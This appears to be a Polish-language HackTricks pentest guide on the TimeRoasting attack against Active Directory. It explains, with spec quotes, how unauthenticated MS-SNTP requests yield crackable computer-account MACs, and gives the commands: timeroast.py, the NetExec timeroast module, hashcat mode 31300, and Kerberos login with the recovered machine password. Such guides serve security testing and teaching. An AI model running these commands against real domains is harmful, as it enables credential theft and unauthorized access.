# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting wykorzystuje przestarzałe rozszerzenie uwierzytelniania MS-SNTP. W MS-SNTP klient może wysłać żądanie o długości 68 bajtów, które osadza dowolny RID konta komputerowego; kontroler domeny używa hasha NTLM konta komputerowego (MD4) jako klucza do obliczenia MAC dla odpowiedzi i zwraca go. Atakujący mogą zebrać te MACi MS-SNTP bez uwierzytelnienia i złamać je offline (Hashcat mode 31300), aby odzyskać hasła kont komputerowych.

Zobacz sekcję 3.1.5.1 "Authentication Request Behavior" oraz 4 "Protocol Examples" w oficjalnej specyfikacji MS-SNTP po szczegóły.
![](../../images/Pasted%20image%2020250709114508.png)
Gdy element ADM ExtendedAuthenticatorSupported ma wartość false, klient wysyła żądanie o długości 68 bajtów i osadza RID w 31 najmniej znaczących bitach podpola Key Identifier authenticatora.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

Z sekcji 4 (Protocol Examples):

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

Crypto-checksum opiera się na MD5 (zob. 3.2.5.1.1) i może zostać złamany offline, umożliwiając atak typu roasting.

## Jak przeprowadzić atak

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Skrypty Timeroasting autorstwa Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktyczny atak (unauth) z NetExec + Hashcat

- NetExec może enumerować i zbierać MS-SNTP MACs dla computer RIDs unauthenticated i wypisywać $sntp-ms$ hashes gotowe do cracking:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline za pomocą Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Odzyskany cleartext odpowiada hasłu konta komputera. Spróbuj użyć go bezpośrednio jako machine account przy użyciu Kerberos (-k), gdy NTLM jest wyłączony:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Wskazówki operacyjne
- Upewnij się, że czas jest poprawnie zsynchronizowany przed użyciem Kerberos: `sudo ntpdate <dc_fqdn>`
- W razie potrzeby wygeneruj krb5.conf dla realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Mapuj RIDs na principals później przy użyciu LDAP/BloodHound, gdy uzyskasz uwierzytelniony punkt zaczepienia.

## Referencje

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
